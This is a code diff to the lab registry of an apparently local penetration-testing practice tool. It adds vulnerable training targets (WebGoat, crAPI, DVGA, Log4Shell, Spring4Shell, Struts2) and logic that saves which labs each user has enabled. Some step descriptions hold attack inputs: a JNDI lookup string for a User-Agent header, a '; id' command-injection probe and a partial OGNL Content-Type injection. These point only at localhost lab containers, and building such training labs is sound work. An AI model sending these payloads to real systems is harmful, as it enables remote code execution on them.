@@ -37,11 +37,19 @@ from dataclasses import dataclass, field
 from pathlib import Path
 from typing import Any, Literal
 
+from lib.platform_util import app_data_dir
+
 logger = logging.getLogger(__name__)
 
 
 # ── Paths ────────────────────────────────────────────────────────────────────
 LABS_DIR = Path(__file__).resolve().parent.parent / "labs"
+
+# Per-user override of which labs are visible in the main grid. Stored as
+# ``{id: bool}``. Anything missing falls back to ``LabDef.enabled_by_default``.
+# Lives in the app data dir so it survives backend restarts.
+_ENABLED_OVERRIDES_PATH = app_data_dir() / "labs_enabled.json"
+_enabled_overrides: dict[str, bool] | None = None
 
 
 # ── Lab registry ─────────────────────────────────────────────────────────────
@@ -92,6 +100,12 @@ class LabDef:
     sidecar_container: str = ""
     # Whitelist of commands the sidecar-exec endpoint will run.
     sidecar_allowed_cmds: tuple[str, ...] = ()
+    # Whether this lab appears in the main grid out of the box. Newer
+    # catalog-only labs ship with ``False`` so the grid stays tidy until
+    # the user clicks "+ Add Lab" and opts in.
+    enabled_by_default: bool = True
+    # Short tag shown on catalog cards — "Web", "API", "CVE", "Network".
+    category: str = "Web"
 
     @property
     def primary_url(self) -> str:
@@ -119,6 +133,7 @@ LABS: dict[str, LabDef] = {
         port_map={3000: 8083},
         default_creds="admin@juice-sh.op / admin123 (try registering, too)",
         build_dir="juice-shop",
+        category="Web",
         suggested_steps=(
             SuggestedStep(
                 label="Fingerprint the app",
@@ -167,6 +182,7 @@ LABS: dict[str, LabDef] = {
         port_map={},  # nothing published — sidecar exec is the only entry
         default_creds="MySQL root (no pw) · admin/admin · dev/dev · FTP anon · SMB guest",
         build_dir="vulhub-net",
+        category="Network",
         kind="compose",
         compose_project="mhp-lab-vulhub-net",
         compose_services=("scanner", "node-web", "node-files", "node-db"),
@@ -228,6 +244,7 @@ LABS: dict[str, LabDef] = {
         },
         default_creds="msfadmin / msfadmin · root / toor · MySQL root no pw",
         build_dir="metasploitable",
+        category="Network",
         suggested_steps=(
             SuggestedStep(
                 label="Port scan the lab",
@@ -285,6 +302,252 @@ LABS: dict[str, LabDef] = {
             ),
         ),
     ),
+    "webgoat": LabDef(
+        id="webgoat",
+        name="OWASP WebGoat + WebWolf",
+        summary=(
+            "OWASP's guided learn-by-doing platform — lessons across SQLi, XSS, "
+            "auth, deserialization, JWT, and SSRF. WebWolf runs alongside as the "
+            "attacker-controlled listener for the exfil/CSRF exercises."
+        ),
+        image_tag="mhp/lab-webgoat:latest",
+        container_name="mhp-lab-webgoat",
+        port_map={8080: 8084, 9090: 9094},
+        default_creds="register any user — local-only DB",
+        build_dir="webgoat",
+        category="Web",
+        enabled_by_default=False,
+        kind="compose",
+        compose_project="mhp-lab-webgoat",
+        compose_services=("webgoat", "webwolf"),
+        suggested_steps=(
+            SuggestedStep(
+                label="Open WebGoat",
+                route="http",
+                query={"target": "http://127.0.0.1:8084/WebGoat"},
+                description="Default landing path — register, then pick a lesson group.",
+            ),
+            SuggestedStep(
+                label="Fingerprint the app",
+                route="fingerprint",
+                query={"target": "http://127.0.0.1:8084/WebGoat"},
+                description="Spring Boot / Tomcat banner + headers.",
+            ),
+            SuggestedStep(
+                label="JWT analysis (WebGoat JWT lessons)",
+                route="jwt",
+                query={"target": "http://127.0.0.1:8084/WebGoat"},
+                description="WebGoat hands out JWTs that are vulnerable in various ways — none/RS256-to-HS256/etc.",
+            ),
+            SuggestedStep(
+                label="Open WebWolf (listener)",
+                route="http",
+                query={"target": "http://127.0.0.1:9094/WebWolf"},
+                description="Companion service for CSRF / exfil exercises — your attacker-controlled origin.",
+            ),
+        ),
+    ),
+    "crapi": LabDef(
+        id="crapi",
+        name="OWASP crAPI",
+        summary=(
+            "Completely Ridiculous API — vulnerable car-service REST/GraphQL "
+            "stack covering the full OWASP API Top 10 (BOLA, mass assignment, "
+            "improper asset management, SSRF, JWT issues). Heavy stack: web + "
+            "identity + community + workshop + mongo + postgres + mailhog."
+        ),
+        image_tag="mhp/lab-crapi:latest",
+        container_name="mhp-lab-crapi-web",
+        # Web on 8888 + mailhog on 8025 published. Everything else internal.
+        port_map={8888: 8085, 8025: 8095},
+        default_creds="register a fresh account — uses mailhog at :8095 for verification",
+        build_dir="crapi",
+        category="API",
+        enabled_by_default=False,
+        kind="compose",
+        compose_project="mhp-lab-crapi",
+        compose_services=(
+            "crapi-web", "crapi-identity", "crapi-community", "crapi-workshop",
+            "mongodb", "postgresdb", "mailhog",
+        ),
+        suggested_steps=(
+            SuggestedStep(
+                label="Open crAPI",
+                route="http",
+                query={"target": "http://127.0.0.1:8085"},
+                description="Landing page — register, verify via mailhog at :8095, then explore the API.",
+            ),
+            SuggestedStep(
+                label="Open mailhog (read verification email)",
+                route="http",
+                query={"target": "http://127.0.0.1:8095"},
+                description="crAPI emails the signup verification token here — copy/paste it back into the app.",
+            ),
+            SuggestedStep(
+                label="Fingerprint the API",
+                route="fingerprint",
+                query={"target": "http://127.0.0.1:8085/identity"},
+                description="Reverse-proxied Spring + Go services — banners reveal the split.",
+            ),
+            SuggestedStep(
+                label="JWT analysis",
+                route="jwt",
+                query={"target": "http://127.0.0.1:8085"},
+                description="crAPI hands out JWTs with predictable secrets and key-confusion bugs.",
+            ),
+        ),
+    ),
+    "dvga": LabDef(
+        id="dvga",
+        name="Damn Vulnerable GraphQL App",
+        summary=(
+            "GraphQL-focused vulnerable app — introspection always on, batched "
+            "queries, deep nesting DoS, IDOR via node IDs, and command injection "
+            "via a vulnerable resolver. The reference target for GraphQL recon."
+        ),
+        image_tag="mhp/lab-dvga:latest",
+        container_name="mhp-lab-dvga",
+        port_map={5013: 8086},
+        default_creds="no auth on most endpoints — introspection is open",
+        build_dir="dvga",
+        category="API",
+        enabled_by_default=False,
+        suggested_steps=(
+            SuggestedStep(
+                label="Open DVGA",
+                route="http",
+                query={"target": "http://127.0.0.1:8086"},
+                description="GraphiQL IDE is mounted at /.",
+            ),
+            SuggestedStep(
+                label="HTTP probe (find the GraphQL endpoint)",
+                route="http",
+                query={"target": "http://127.0.0.1:8086/graphql"},
+                description="POST {\"query\":\"{__schema{types{name}}}\"} to dump the schema.",
+            ),
+            SuggestedStep(
+                label="Command injection (systemUpdate)",
+                route="cmdi",
+                query={"target": "http://127.0.0.1:8086/graphql"},
+                description="The systemUpdate mutation passes user input to a shell — try ; id.",
+            ),
+            SuggestedStep(
+                label="Fingerprint",
+                route="fingerprint",
+                query={"target": "http://127.0.0.1:8086"},
+                description="Flask + Graphene banner; should leak the framework.",
+            ),
+        ),
+    ),
+    "log4shell": LabDef(
+        id="log4shell",
+        name="Log4Shell (CVE-2021-44228)",
+        summary=(
+            "Spring Boot app that logs the User-Agent header through a "
+            "vulnerable log4j 2.14.x. Hitting it with a JNDI payload in the "
+            "header triggers the classic outbound LDAP fetch. Pair with your "
+            "own LDAP listener (marshalsec / JNDIExploit) on the host."
+        ),
+        image_tag="mhp/lab-log4shell:latest",
+        container_name="mhp-lab-log4shell",
+        port_map={8080: 8087},
+        default_creds="no auth — just send a request",
+        build_dir="log4shell",
+        category="CVE",
+        enabled_by_default=False,
+        suggested_steps=(
+            SuggestedStep(
+                label="Hit the vulnerable endpoint",
+                route="http",
+                query={"target": "http://127.0.0.1:8087/"},
+                description="GET / logs the User-Agent — set it to ${jndi:ldap://127.0.0.1:1389/Exploit} after starting a listener.",
+            ),
+            SuggestedStep(
+                label="Fingerprint",
+                route="fingerprint",
+                query={"target": "http://127.0.0.1:8087"},
+                description="Spring Boot banner; X-Application-Context header on some routes.",
+            ),
+            SuggestedStep(
+                label="Read the response headers",
+                route="http",
+                query={"target": "http://127.0.0.1:8087/", "method": "GET"},
+                description="Confirm the app is up and reflective enough to trigger log4j on the User-Agent path.",
+            ),
+        ),
+    ),
+    "spring4shell": LabDef(
+        id="spring4shell",
+        name="Spring4Shell (CVE-2022-22965)",
+        summary=(
+            "Vulnerable Spring MVC + Tomcat stack — DataBinder reaches the "
+            "ClassLoader through nested property paths and writes a JSP webshell "
+            "into the webroot. Exploit lands at /shell.jsp after a single POST."
+        ),
+        image_tag="mhp/lab-spring4shell:latest",
+        container_name="mhp-lab-spring4shell",
+        port_map={8080: 8088},
+        default_creds="no auth — POST a form to /",
+        build_dir="spring4shell",
+        category="CVE",
+        enabled_by_default=False,
+        suggested_steps=(
+            SuggestedStep(
+                label="Open the app",
+                route="http",
+                query={"target": "http://127.0.0.1:8088/"},
+                description="Simple Spring MVC form — the DataBinder bug is reachable from the default endpoint.",
+            ),
+            SuggestedStep(
+                label="Fingerprint",
+                route="fingerprint",
+                query={"target": "http://127.0.0.1:8088/"},
+                description="Spring MVC + Tomcat banner. Check headers for Spring Boot vs WAR-on-Tomcat.",
+            ),
+            SuggestedStep(
+                label="Brute / probe parameters",
+                route="dirb",
+                query={"target": "http://127.0.0.1:8088/"},
+                description="Spray endpoints — after exploitation, /shell.jsp shows up here.",
+            ),
+        ),
+    ),
+    "struts2-rce": LabDef(
+        id="struts2-rce",
+        name="Apache Struts2 RCE (CVE-2017-5638)",
+        summary=(
+            "Vulnerable Struts2 app — Jakarta multipart parser evaluates an "
+            "OGNL expression in the Content-Type header, giving unauthenticated "
+            "RCE. Pre-built image from piesecurity, used in countless walkthroughs."
+        ),
+        image_tag="mhp/lab-struts2-rce:latest",
+        container_name="mhp-lab-struts2-rce",
+        port_map={8080: 8089},
+        default_creds="no auth — set a malicious Content-Type and POST anywhere",
+        build_dir="struts2-rce",
+        category="CVE",
+        enabled_by_default=False,
+        suggested_steps=(
+            SuggestedStep(
+                label="Open the demo app",
+                route="http",
+                query={"target": "http://127.0.0.1:8089/struts2-showcase/"},
+                description="Struts2 showcase page — POST here with an OGNL Content-Type to trigger RCE.",
+            ),
+            SuggestedStep(
+                label="Fingerprint",
+                route="fingerprint",
+                query={"target": "http://127.0.0.1:8089/struts2-showcase/"},
+                description="Tomcat + Struts2 banner; framework leaks via action URLs.",
+            ),
+            SuggestedStep(
+                label="Command injection probe",
+                route="cmdi",
+                query={"target": "http://127.0.0.1:8089/struts2-showcase/showcase.action"},
+                description="OGNL injection via Content-Type: %{(#cmd='id')...}.",
+            ),
+        ),
+    ),
     "dvwa": LabDef(
         id="dvwa",
         name="DVWA",
@@ -298,6 +561,7 @@ LABS: dict[str, LabDef] = {
         port_map={80: 8081},
         default_creds="admin / password",
         build_dir="dvwa",
+        category="Web",
         suggested_steps=(
             SuggestedStep(
                 label="Port scan the lab",
@@ -367,8 +631,77 @@ def _build_state(lab_id: str) -> BuildState:
 
 
 # ── Public API ───────────────────────────────────────────────────────────────
+def _load_overrides() -> dict[str, bool]:
+    """Read the enabled-overrides JSON. Cached after first call.
+
+    Missing / corrupt file is treated as "no overrides" — every lab falls
+    back to its ``enabled_by_default``.
+    """
+    global _enabled_overrides
+    if _enabled_overrides is not None:
+        return _enabled_overrides
+    try:
+        if _ENABLED_OVERRIDES_PATH.exists():
+            raw = json.loads(_ENABLED_OVERRIDES_PATH.read_text(encoding="utf-8"))
+            if isinstance(raw, dict):
+                _enabled_overrides = {str(k): bool(v) for k, v in raw.items()}
+                return _enabled_overrides
+    except Exception as exc:
+        logger.warning("labs_enabled.json read failed: %s", exc)
+    _enabled_overrides = {}
+    return _enabled_overrides
+
+
+def _save_overrides() -> None:
+    overrides = _load_overrides()
+    try:
+        _ENABLED_OVERRIDES_PATH.write_text(
+            json.dumps(overrides, indent=2, sort_keys=True), encoding="utf-8",
+        )
+    except Exception as exc:
+        logger.warning("labs_enabled.json write failed: %s", exc)
+
+
+def is_enabled(lab_id: str) -> bool:
+    """True if ``lab_id`` should appear in the main grid.
+
+    Resolution: user override → lab default → False (unknown lab).
+    """
+    overrides = _load_overrides()
+    if lab_id in overrides:
+        return overrides[lab_id]
+    lab = LABS.get(lab_id)
+    return bool(lab and lab.enabled_by_default)
+
+
+def set_enabled(lab_id: str, enabled: bool) -> None:
+    """Persist a user override for a lab's visibility in the main grid."""
+    if lab_id not in LABS:
+        raise KeyError(lab_id)
+    overrides = _load_overrides()
+    overrides[lab_id] = bool(enabled)
+    _save_overrides()
+
+
 def list_labs() -> list[dict[str, Any]]:
-    return [_lab_summary(lab) for lab in LABS.values()]
+    """Enabled labs only — the data behind the main grid."""
+    return [_lab_summary(lab) for lab in LABS.values() if is_enabled(lab.id)]
+
+
+def list_catalog() -> list[dict[str, Any]]:
+    """All labs, each tagged with its current effective enabled state.
+
+    Drives the "+ Add Lab" drawer — disabled entries get an Enable button,
+    enabled entries (especially non-default ones) get a Disable affordance.
+    """
+    out: list[dict[str, Any]] = []
+    for lab in LABS.values():
+        summary = _lab_summary(lab)
+        summary["enabled"] = is_enabled(lab.id)
+        summary["enabled_by_default"] = lab.enabled_by_default
+        summary["category"] = lab.category
+        out.append(summary)
+    return out
 
 
 def get_lab_def(lab_id: str) -> LabDef | None:
@@ -842,6 +1175,7 @@ def _lab_summary(lab: LabDef) -> dict[str, Any]:
         "name":            lab.name,
         "summary":         lab.summary,
         "kind":            lab.kind,
+        "category":        lab.category,
         "image_tag":       lab.image_tag,
         "container_name":  lab.container_name,
         "port_map":        {str(k): v for k, v in lab.port_map.items()},
